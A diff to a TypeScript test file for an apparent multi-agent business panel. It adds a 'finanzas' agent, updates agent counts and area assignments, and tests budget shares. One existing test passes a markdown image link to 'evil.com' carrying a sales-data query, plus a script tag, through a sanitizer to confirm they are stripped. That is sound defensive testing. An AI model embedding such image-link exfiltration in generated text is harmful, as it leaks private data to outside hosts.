@@ -12,7 +12,7 @@ test("customer text leaves without emails, phones or links", () => {
 test("built-in agents' shares add up to the whole budget", () => {
   const total = agentsOf(DEFAULT_STATE()).reduce((a, x) => a + x.sharePct, 0);
   assert.equal(total, 100);
-  assert.deepEqual(BUILTIN_IDS, ["general", "ceo", "produccion", "seguridad", "novedades", "soporte", "marketing", "creativos", "trafico", "organico"]);
+  assert.deepEqual(BUILTIN_IDS, ["general", "ceo", "produccion", "seguridad", "novedades", "finanzas", "soporte", "marketing", "creativos", "trafico", "organico"]);
 });
 
 test("budget left per agent and in total", () => {
@@ -34,7 +34,9 @@ test("owner's agents: checked, named, edited instructions win", () => {
   assert.equal(newAgentId(st, "Márketing!"), "a-marketing-2");
   st.missions.ceo = "Instrucciones nuevas del dueño para el CEO.";
   assert.equal(agentsOf(st).find((x) => x.id === "ceo")!.mission, "Instrucciones nuevas del dueño para el CEO.");
-  assert.equal(agentsOf(st).length, 11);
+  assert.equal(agentsOf(st).length, 12);
+  assert.equal(agentsOf(st).find((x) => x.id === "a-marketing")!.equipo, "direccion");
+  assert.equal(agentsOf(st).find((x) => x.id === "finanzas")!.equipo, "numeros");
 });
 
 test("cost: the API's own figure wins, otherwise tokens, reasoning and searches", () => {
@@ -76,4 +78,11 @@ test("assignments sent to GitHub carry no links, images or mentions", async () =
   const t = plainForIssue("mira ![x](https://evil.com/?d=ventas) y [aquí](https://a.com) @alguien #12 <script>");
   assert.ok(!/https?:|!\[|@alguien|#12|<script>/.test(t), t);
   assert.match(t, /aquí/);
+});
+
+test("every built-in agent belongs to exactly one area of the panel", async () => {
+  const { AREAS } = await import("../src/lib/areas");
+  const all = AREAS.flatMap((a) => a.agents);
+  assert.equal(new Set(all).size, all.length);
+  assert.deepEqual([...all].sort(), [...BUILTIN_IDS].sort());
 });
